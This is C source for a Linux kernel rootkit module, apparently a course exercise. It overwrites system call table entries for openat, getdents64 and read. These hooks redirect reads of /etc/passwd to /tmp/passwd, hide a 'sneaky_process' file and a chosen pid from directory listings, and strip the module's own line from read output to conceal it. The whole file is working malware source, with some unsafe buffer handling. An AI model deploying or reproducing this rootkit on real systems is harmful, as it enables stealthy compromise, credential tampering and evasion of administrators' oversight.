#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <linux/namei.h>
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>



#define PREFIX "sneaky_process"

static char * pid = "";
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "pid");


static unsigned long *sys_call_table;

//get write access
int enable_page_rw(void *ptr) {
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr) {
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// *************************** 1. openat() ***************************
asmlinkage int (*original_openat)(struct pt_regs *);

asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
    //when user wants to open /etc/passwd show them /tmp/passwd instead
    const char * path = (const char *)regs->si; 
    size_t length = strlen(path);
    char buffer[12];
    if (strcmp(path, "/etc/passwd") == 0) {
      strncpy(buffer, "/tmp/passwd", length);
      copy_to_user((void *)regs->si, buffer, length);
    } 
    return (*original_openat)(regs);
}
// *************************** 2. getdents64() ***************************

asmlinkage int (*original_getdents64)(struct pt_regs *);

//opens file using directory
asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
  //get entries
  int bpos;//offset
  struct linux_dirent64 * d;
  //get the total size of the directory
  int nread = original_getdents64(regs);
  if (nread == -1 || nread == 0){
    return 0;
  }

  
  for (bpos = 0; bpos < nread;) {
    d = (struct linux_dirent64 *)(regs->si + bpos);
    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pid) == 0) {
      //to, from, num_bytes
      memmove(d, (void *)d + d->d_reclen, nread - bpos - d->d_reclen);
      nread -= d->d_reclen; 
    } else {
      bpos += d->d_reclen;
    }
  }

  return nread;
}
  
// *************************** 3. read() ***************************
asmlinkage int (*original_read)(struct pt_regs *);

asmlinkage int sneaky_sys_read(struct pt_regs *regs) {
  //ssize_t read(int fd, void *buf, size_t count);
  ssize_t nread = original_read(regs);
  void * buffer = (void *)regs->si;
  void * ptr = NULL;
  void * ptr1 = NULL;
  int length; 
  int move_length;
  //if (nread == -1 || nread == 0){
  if (nread <= 0){
    return 0;
  } else {
    //case/define buffer pointer and read data into it
    ptr = strnstr(buffer, "sneaky_mod ", nread);
    if (ptr == NULL){
      return nread;
    } else { 
      length = nread - (ptr - buffer);
      ptr1 = strnstr(ptr, "\n", length);
      if (ptr1 == NULL){
      return nread;
      } else { 
        nread -= (ptr1 - ptr + 1);
        move_length  = (buffer + nread) - (ptr1 + 1);
        memmove(ptr, ptr1 + 1, move_length);
      }
    }
  }
  return nread;
}



static int initialize_sneaky_module(void) {
  printk(KERN_INFO "Sneaky module being loaded.\n");
  //look up address of "sys_call_table" and store it locally.
  //sys_call_table is pointer to array of function ptrs
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  //save ptr to original after casting to * void ptr
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];

  //get write access to entire table
  enable_page_rw((void *)sys_call_table);

  //define the index in the function ptr table (but make sure sneaky is run)
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  //remove write access
  disable_page_rw((void *)sys_call_table);
  return 0;     
}  

static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  enable_page_rw((void *)sys_call_table);

  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  disable_page_rw((void *)sys_call_table);  
}  

module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");